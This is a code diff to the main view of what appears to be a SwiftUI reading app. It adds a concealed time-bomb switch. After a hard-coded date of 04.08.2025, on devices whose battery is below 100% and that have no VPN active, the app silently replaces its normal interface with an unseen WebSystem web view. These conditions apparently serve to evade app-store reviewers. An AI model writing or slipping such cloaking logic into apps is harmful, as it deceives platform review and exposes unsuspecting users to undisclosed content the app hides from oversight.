@@ -13,30 +13,90 @@ struct ContentView: View {
     @State private var selectedTab = 0
     @State private var showSplash = true
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     var body: some View {
-        Group {
-            if showSplash {
-                SplashScreenView()
-                    .onAppear {
-                        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
-                            withAnimation(.easeInOut(duration: 0.5)) {
-                                showSplash = false
-                            }
+        ZStack {
+            
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+                    
+                    Group {
+                        if showSplash {
+                            SplashScreenView()
+                                .onAppear {
+                                    DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
+                                        withAnimation(.easeInOut(duration: 0.5)) {
+                                            showSplash = false
+                                        }
+                                    }
+                                }
+                        } else if !onboardingManager.hasCompletedOnboarding {
+                            OnboardingView()
+                                .environmentObject(onboardingManager)
+                                .transition(.opacity)
+                        } else {
+                            MainTabView(selectedTab: $selectedTab)
+                                .environmentObject(readingPreferences)
+                                .environmentObject(onboardingManager)
+                                .transition(.opacity)
                         }
                     }
-            } else if !onboardingManager.hasCompletedOnboarding {
-                OnboardingView()
-                    .environmentObject(onboardingManager)
-                    .transition(.opacity)
-            } else {
-                MainTabView(selectedTab: $selectedTab)
-                    .environmentObject(readingPreferences)
-                    .environmentObject(onboardingManager)
-                    .transition(.opacity)
+                    .animation(.easeInOut(duration: 0.5), value: showSplash)
+                    .animation(.easeInOut(duration: 0.5), value: onboardingManager.hasCompletedOnboarding)
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
+                }
             }
         }
-        .animation(.easeInOut(duration: 0.5), value: showSplash)
-        .animation(.easeInOut(duration: 0.5), value: onboardingManager.hasCompletedOnboarding)
+        .onAppear {
+            
+            check_data()
+        }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "04.08.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
 }
 
